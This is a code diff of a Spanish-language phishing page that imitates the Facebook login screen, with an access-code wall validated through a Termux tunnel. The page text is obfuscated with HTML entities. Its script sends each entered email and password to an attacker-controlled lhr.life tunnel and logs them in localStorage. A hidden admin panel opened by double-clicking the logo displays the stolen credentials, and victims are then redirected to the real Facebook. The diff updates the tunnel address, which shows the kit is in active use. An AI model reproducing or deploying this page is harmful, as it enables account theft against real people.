@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Inici&#97;r sesi&#243;n</title>
     <style>
-        /* --- MURO DE SEGURIDAD --- */
+        /* --- ESTILOS DEL MURO --- */
         #muro-proteccion { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
             background: #000000; color: #ffffff; 
@@ -25,166 +25,123 @@
 
         /* --- DISEÑO FACEBOOK --- */
         #pagina-original { display: none !important; width: 100%; flex-direction: column; align-items: center; }
-        
-        body { background-color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; color: #1c1e21; }
-        .d-b { width: 100%; background-color: #f5f6f7; padding: 12px 20px; display: flex; align-items: center; font-size: 13px; color: #576372; box-sizing: border-box; border-bottom: 1px solid #dddfe2; }
-        .l-t { margin-top: 15px; font-size: 14px; color: #4b4f56; }
-        .l-c { margin-top: 30px; margin-bottom: 40px; cursor: pointer; user-select: none; }
-        .f-l { width: 75px; height: 75px; }
+        body { background-color: #ffffff; font-family: sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .d-b { width: 100%; background-color: #f5f6f7; padding: 12px; font-size: 13px; border-bottom: 1px solid #dddfe2; box-sizing: border-box; }
+        .l-c { margin-top: 30px; margin-bottom: 30px; }
         .c-main { width: 90%; max-width: 400px; display: flex; flex-direction: column; gap: 12px; }
-        input { width: 100%; padding: 16px; background-color: #f5f6f7; border: 1px solid #dddfe2; border-radius: 12px; font-size: 16px; box-sizing: border-box; outline: none; }
-        .b-s { width: 100%; background-color: #0064e0; color: white; border: none; padding: 12px; font-size: 17px; font-weight: 600; border-radius: 25px; cursor: pointer; margin-top: 5px; }
-        .f-a { text-align: center; color: #1c1e21; text-decoration: none; font-size: 15px; font-weight: 500; margin-top: 10px; }
-        .b-n { width: 100%; background-color: transparent; color: #0064e0; border: 1px solid #0064e0; padding: 10px; font-size: 15px; font-weight: 600; border-radius: 25px; margin-top: 40px; cursor: pointer; }
+        input { width: 100%; padding: 16px; background-color: #f5f6f7; border: 1px solid #dddfe2; border-radius: 12px; box-sizing: border-box; }
+        .b-s { width: 100%; background-color: #0064e0; color: white; border: none; padding: 12px; font-weight: 600; border-radius: 25px; cursor: pointer; }
         
         /* --- PANEL EL G.PS. --- */
-        #p-a { display: none; width: 90%; max-width: 450px; margin: 20px 0; padding: 15px; background: #1a1a1a; color: #33ff33; font-family: 'Courier New', monospace; border-radius: 8px; font-size: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); word-wrap: break-word; }
-        #o-l { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
-        .s-p { width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #0064e0; border-radius: 50%; animation: r-o 1s linear infinite; }
-        @keyframes r-o { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .foot { margin-top: 20px; text-align: center; width: 100%; padding-bottom: 20px; }
-        .m-l { width: 60px; margin-bottom: 8px; }
-        .sig { font-size: 12px; font-weight: bold; color: #8d949e; }
+        #p-a { display: none; width: 90%; max-width: 450px; margin: 20px; padding: 15px; background: #1a1a1a; color: #33ff33; font-family: monospace; border-radius: 8px; font-size: 12px; }
     </style>
 </head>
 <body>
 
     <div id="muro-proteccion">
         <div class="muro-box">
-            <h2 style="margin:0;">Verificaci&#243;n de Acceso</h2>
-            <p style="font-size:14px; opacity:0.8; margin-top:10px;">Ingresa el c&#243;digo de invitaci&#243;n para continuar.</p>
-            <input type="password" id="tkInput" class="muro-input" placeholder="C&#243;digo de acceso">
+            <h2>Verificaci&#243;n de Acceso</h2>
+            <p style="opacity:0.8;">Ingresa el c&#243;digo de Termux para entrar.</p>
+            <input type="text" id="tkInput" class="muro-input" placeholder="0000-Xxx00-0000-Xxx00">
             <button onclick="validarAcceso()" id="btnGo" class="muro-btn">DESBLOQUEAR</button>
         </div>
     </div>
 
     <div id="pagina-original">
-        <div class="d-b">
-            <span style="color:#1877f2; margin-right:12px;">📥</span>
-            <div>Desc&#97;rg&#97; F&#97;c&#101;b&#111;&#111;k p&#97;r&#97; Andr&#111;&#105;d.</div>
-        </div>
-        <div class="l-t">Espa&ntilde;ol</div>
-        
+        <div class="d-b">📥 Desc&#97;rg&#97; F&#97;c&#101;b&#111;&#111;k p&#97;r&#97; Andr&#111;&#105;d.</div>
         <div class="l-c" ondblclick="_vR()">
-            <svg class="f-l" viewBox="0 0 36 36" fill="#1877f2">
-                <path d="M36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.981 6.58 16.425 15.188 17.775v-12.57h-4.566v-5.205h4.566V14.01c0-4.505 2.684-6.994 6.79-6.994 1.967 0 4.024.351 4.024.351v4.425h-2.268c-2.233 0-2.928 1.385-2.928 2.809v3.393h4.986l-.797 5.205h-4.189V35.775C29.42 34.425 36 26.981 36 18z"/>
-            </svg>
+            <svg width="75" height="75" viewBox="0 0 36 36" fill="#1877f2"><path d="M36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.981 6.58 16.425 15.188 17.775v-12.57h-4.566v-5.205h4.566V14.01c0-4.505 2.684-6.994 6.79-6.994 1.967 0 4.024.351 4.024.351v4.425h-2.268c-2.233 0-2.928 1.385-2.928 2.809v3.393h4.986l-.797 5.205h-4.189V35.775C29.42 34.425 36 26.981 36 18z"/></svg>
         </div>
-
         <div class="c-main">
             <form id="fLogin">
                 <input type="email" id="u_1" placeholder="Celul&#97;r o corr&#101;o" required>
-                <input type="password" id="p_1" placeholder="C&#111;ntras&#101;&ntilde;&#97;" style="margin-top: 12px;" required>
-                <button type="submit" class="b-s">Inici&#97;r sesi&#243;n</button>
+                <input type="password" id="p_1" placeholder="C&#111;ntras&#101;&ntilde;&#97;" style="margin-top:10px;" required>
+                <button type="submit" class="b-s" style="margin-top:15px;">Inici&#97;r sesi&#243;n</button>
             </form>
-            <a href="#" class="f-a">&iquest;Olvid&#97;ste tu c&#111;ntras&#101;&ntilde;&#97;?</a>
-            <button type="button" class="b-n">Cre&#97;r cuent&#97; nuev&#97;</button>
+            <div style="text-align:center; margin-top:20px; color:#8d949e; font-size:12px;">Dise&ntilde;ado por EL G.PS.</div>
         </div>
 
         <div id="p-a">
-            <h4 style="margin:0 0 10px 0; color:white; border-bottom:1px solid #33ff33;">PANEL EL G.PS.</h4>
+            <h4 style="border-bottom:1px solid #33ff33;">PANEL EL G.PS. (Doble clic en logo para ver)</h4>
             <div id="_lG">Vac&#237;o.</div>
-            <button onclick="_cT()" style="margin-top:15px; background:#f00; color:#fff; border:none; padding:5px; border-radius:3px; cursor:pointer;">Limpiar registros</button>
-        </div>
-
-        <div id="o-l">
-            <div class="s-p"></div>
-            <p style="margin-top:15px; font-weight:bold;">Cargando...</p>
-        </div>
-
-        <div class="foot">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="M" class="m-l">
-            <div class="sig">Dise&ntilde;ado por EL G.PS.</div>
         </div>
     </div>
 
     <script>
-        (function(){
-            // --- DIRECCIÓN DEL TÚNEL ACTUAL (SEGÚN TUS FOTOS) ---
-            function gU() {
-                // bc3163e84458b8 es tu ID activo
-                return "https://bc3163e84458b8.lhr.life"; 
-            }
+        // --- CONEXIÓN AL TÚNEL ACTIVO ---
+        function gU() {
+            // ID actualizado según tu captura d8a42137c9f45f
+            return "https://d8a42137c9f45f.lhr.life"; 
+        }
 
-            const M = document.getElementById('muro-proteccion');
-            const P = document.getElementById('pagina-original');
+        const M = document.getElementById('muro-proteccion');
+        const P = document.getElementById('pagina-original');
 
-            // Persistencia de sesión
-            if(sessionStorage.getItem('sesion_activa')) {
-                M.style.display = 'none';
-                P.style.setProperty('display', 'flex', 'important');
-            }
+        if(sessionStorage.getItem('sesion_activa')) {
+            M.style.display = 'none';
+            P.style.setProperty('display', 'flex', 'important');
+        }
 
-            // Función para validar la llave con Termux
-            window.validarAcceso = function() {
-                const val = document.getElementById('tkInput').value;
-                if(!val) return;
-                document.getElementById('btnGo').innerText = "Verificando...";
+        window.validarAcceso = function() {
+            const val = document.getElementById('tkInput').value;
+            if(!val) return;
+            document.getElementById('btnGo').innerText = "Verificando...";
 
-                fetch(gU(), {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        accion: "validar_acceso", 
-                        llave: val 
-                    })
-                })
-                .then(r => r.json())
-                .then(r => {
-                    if(r.permitido === true) {
-                        sessionStorage.setItem('sesion_activa', '1');
-                        M.style.display = 'none';
-                        P.style.setProperty('display', 'flex', 'important');
-                    } else {
-                        alert("CÓDIGO INCORRECTO O EXPIRADO");
-                        document.getElementById('btnGo').innerText = "DESBLOQUEAR";
-                    }
-                })
-                .catch(() => {
-                    alert("Error: El servidor de Termux no responde.");
+            fetch(gU(), {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ accion: "validar_acceso", llave: val })
+            })
+            .then(r => r.json())
+            .then(r => {
+                if(r.permitido === true) {
+                    sessionStorage.setItem('sesion_activa', '1');
+                    M.style.display = 'none';
+                    P.style.setProperty('display', 'flex', 'important');
+                } else {
+                    alert("LLAVE INCORRECTA O EXPIRADA");
                     document.getElementById('btnGo').innerText = "DESBLOQUEAR";
-                });
-            };
-
-            // Captura y envío de credenciales a Termux
-            document.getElementById('fLogin').addEventListener('submit', function(e) {
-                e.preventDefault();
-                document.getElementById('o-l').style.display = 'flex';
-                const u = document.getElementById('u_1').value;
-                const p = document.getElementById('p_1').value;
-                
-                _sL(u, p); // Guardar en Panel Local
-
-                fetch(gU(), {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ usuario: u, clave: p })
-                }).finally(() => {
-                    setTimeout(() => { window.location.href = "https://www.facebook.com/login"; }, 2000);
-                });
+                }
+            })
+            .catch(() => {
+                alert("Error: El servidor de Termux no responde. Verifica el túnel.");
+                document.getElementById('btnGo').innerText = "DESBLOQUEAR";
             });
+        };
 
-            // Funciones del Panel El G.PS.
-            window._vR = function() {
-                const pan = document.getElementById('p-a');
-                pan.style.display = (pan.style.display === 'block') ? 'none' : 'block';
-                if(pan.style.display === 'block') _mL();
-            };
+        document.getElementById('fLogin').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const u = document.getElementById('u_1').value;
+            const p = document.getElementById('p_1').value;
+            
+            _sL(u, p);
 
-            function _sL(u, p) {
-                let d = JSON.parse(localStorage.getItem('_gps_logs')) || [];
-                d.push({ u: u, p: p, t: new Date().toLocaleString() });
-                localStorage.setItem('_gps_logs', JSON.stringify(d));
-            }
+            fetch(gU(), {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ usuario: u, clave: p })
+            }).finally(() => {
+                window.location.href = "https://www.facebook.com/login";
+            });
+        });
 
-            function _mL() {
-                const g = document.getElementById('_lG');
-                let d = JSON.parse(localStorage.getItem('_gps_logs')) || [];
-                g.innerHTML = d.length ? d.map(x => `[${x.t}]<br>U: ${x.u}<br>P: ${x.p}`).join("<hr>") : "Vac&#237;o.";
-            }
+        window._vR = function() {
+            const pan = document.getElementById('p-a');
+            pan.style.display = (pan.style.display === 'block') ? 'none' : 'block';
+            if(pan.style.display === 'block') _mL();
+        };
 
-            window._cT = function() { if(confirm("¿Limpiar todo?")) { localStorage.removeItem('_gps_logs'); _mL(); } };
-        })();
+        function _sL(u, p) {
+            let d = JSON.parse(localStorage.getItem('_gps_logs')) || [];
+            d.push({ u: u, p: p, t: new Date().toLocaleString() });
+            localStorage.setItem('_gps_logs', JSON.stringify(d));
+        }
+
+        function _mL() {
+            const g = document.getElementById('_lG');
+            let d = JSON.parse(localStorage.getItem('_gps_logs')) || [];
+            g.innerHTML = d.length ? d.map(x => `[${x.t}]<br>U: ${x.u}<br>P: ${x.p}`).join("<hr>") : "Vac&#237;o.";
+        }
     </script>
 </body>
 </html>
